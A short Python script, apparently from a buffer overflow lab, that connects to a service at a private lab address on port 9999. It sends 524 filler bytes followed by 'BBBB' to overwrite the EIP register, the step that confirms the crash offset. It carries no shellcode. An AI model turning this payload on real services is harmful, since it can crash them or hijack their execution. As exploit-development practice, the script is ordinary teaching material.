import socket
import sys
from termcolor import colored

HOST = "192.168.56.101"
PORT = 9999 

offset = b"A" * 524
EIP = b"BBBB"
JUNK = b"CCCC"

payload = offset + EIP + JUNK

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    print(colored("[+] Trying to connect ...","yellow"))
    s.connect((HOST,PORT))

except:
    print(colored("[!] Connection error to IP:{}, port:{}", "red").format(HOST,PORT))
    print(colored("[!] Exitting...", "red"))
    sys.exit(0)

print(colored("[+] Connection successful!","yellow"))

s.recv(1024)

s.send(payload)

print(colored("[+] Sending buffer...","yellow"))
s.recv(1024)
